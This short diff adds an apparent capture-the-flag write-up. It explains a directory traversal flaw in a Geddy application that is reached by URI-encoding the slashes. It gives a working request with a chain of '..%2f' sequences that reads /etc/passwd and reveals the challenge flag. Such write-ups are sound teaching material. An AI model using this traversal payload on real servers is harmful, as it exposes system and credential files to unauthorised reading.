@@ -1,0 +1,7 @@
+A quick Google search revealed that a Geddy application is vulnerable to directory traversal by uri encoding
+the slashes. As a result, we can view files on the filesystem by accessing
+
+http://45.55.51.22:40000/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
+
+As it so happens, viewing /etc/passwd shows the flag
+flag{2112_slappa_da_BASS}
